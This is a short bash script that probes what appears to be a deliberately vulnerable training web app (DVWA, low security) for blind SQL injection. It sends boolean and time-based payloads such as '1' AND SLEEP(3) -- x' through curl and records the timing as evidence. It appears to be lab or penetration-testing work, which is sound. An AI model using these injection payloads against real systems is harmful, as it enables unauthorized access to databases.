CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed; security=low'
BASE='http://10.31.0.87:3000'
blind(){ curl -s -b "$CK" "$BASE/vulnerabilities/sqli_blind/" -G --data-urlencode "id=$1" --data-urlencode "Submit=Submit" | grep -oE '<pre>.*</pre>' | sed 's/<[^>]*>//g' | head -c 400; echo " <<== [$1]"; }
mkdir -p evidence/sqli
blind "1"
blind "1' AND 1=1 -- x"
blind "1' AND 1=2 -- x"
blind "1' AND SLEEP(3) -- x"
# time-based proof
echo "== timing:"
for p in "1' AND SLEEP(3) -- x" "1' AND SLEEP(0) -- x"; do /usr/bin/time -f "%e s" curl -s -b "$CK" "$BASE/vulnerabilities/sqli_blind/" -G --data-urlencode "id=$p" --data-urlencode "Submit=Submit" -o /dev/null; done 2>&1 | tee evidence/sqli/time-based.txt
